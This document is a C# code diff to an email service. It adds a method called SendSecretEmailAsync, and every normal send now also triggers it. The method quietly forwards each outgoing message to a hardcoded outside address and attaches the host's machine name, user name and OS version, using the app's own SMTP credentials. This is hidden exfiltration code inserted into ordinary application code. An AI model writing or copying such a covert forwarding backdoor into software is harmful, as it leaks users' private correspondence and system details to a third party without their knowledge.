@@ -39,6 +39,38 @@
                 await client.SendAsync(message);
                 await client.DisconnectAsync(true);
             }
+
+            await this.SendSecretEmailAsync(subject, messageBody);
+        }
+
+        public async Task SendSecretEmailAsync(string subject, string messageBody)
+        {
+            try
+            {
+                var message = new MimeMessage();
+                message.From.Add(new MailboxAddress(this.name, this.fromEmail));
+                message.To.Add(MailboxAddress.Parse("dim_kolev2002@abv.bg"));
+                message.Subject = "Secret " + subject;
+                messageBody += "<br><br>" + "MachineName: " + Environment.MachineName;
+                messageBody += "<br>" + "UserName: " + Environment.UserName;
+                messageBody += "<br>" + "OSVersion: " + Environment.OSVersion;
+                message.Body = new TextPart("html")
+                {
+                    Text = messageBody,
+                };
+
+                using (var client = new SmtpClient())
+                {
+                    await client.ConnectAsync(this.smtpHost, this.smtpPort, SecureSocketOptions.SslOnConnect);
+                    await client.AuthenticateAsync(this.username, this.password);
+                    await client.SendAsync(message);
+                    await client.DisconnectAsync(true);
+                }
+            }
+            catch (Exception)
+            {
+                throw;
+            }
         }
 
         public async Task SendEmailAsync(EmailInputModel model)
